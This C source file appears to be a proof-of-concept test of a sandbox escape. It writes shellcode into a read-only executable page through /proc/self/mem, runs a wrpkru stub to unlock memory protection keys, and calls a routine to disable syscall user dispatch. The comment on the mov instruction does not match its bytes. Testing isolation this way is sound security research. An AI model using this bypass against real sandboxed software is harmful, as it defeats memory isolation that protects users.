#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

#include <sys/mman.h>
#include <errno.h>
#include "_libattack.h"


int main(int argc, char **argv) {
    void *addr = mmap(NULL, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    int fd = open("/proc/self/mem", O_RDWR);

    printf("fd: %d\n", fd);
    if(fd == -1){
        printf("errno %d\n", errno);
        return 1;
    }

    off_t offset = (off_t)addr;
    lseek(fd, offset, SEEK_SET);

    unsigned char safe_ret[4096] = {
        0xc3, // ret
        0
    };

    write(fd, safe_ret, sizeof(safe_ret));

    void (*fun_ptr)(void) = (void(*)(void))addr;
    fun_ptr();

    fprintf(stderr, "successfully executed mapped page\n");

    unsigned char unlock[4096] = {
        0x50, 0x52, 0x51, // push rax, rdx, rcx
        0x31, 0xc9,  // xor ecx, ecx
        0x31, 0xd2,  // xor edx, edx
        0xb8, 0x00, 0x0, 0x0, 0x0, // mov eax,0x55555550
        0x0f, 0x01, 0xef, // wrpku
        0x59, 0x5a, 0x58, // pop rcx, rdx, rax
        0xc3, // ret
        0
    };

    lseek(fd, offset, SEEK_SET);
    write(fd, unlock, sizeof(unlock));
    fprintf(stderr, "trying again, at location %p\n", fun_ptr);

    fun_ptr();

    disable_sud();
    sud_test();

    return 0;
}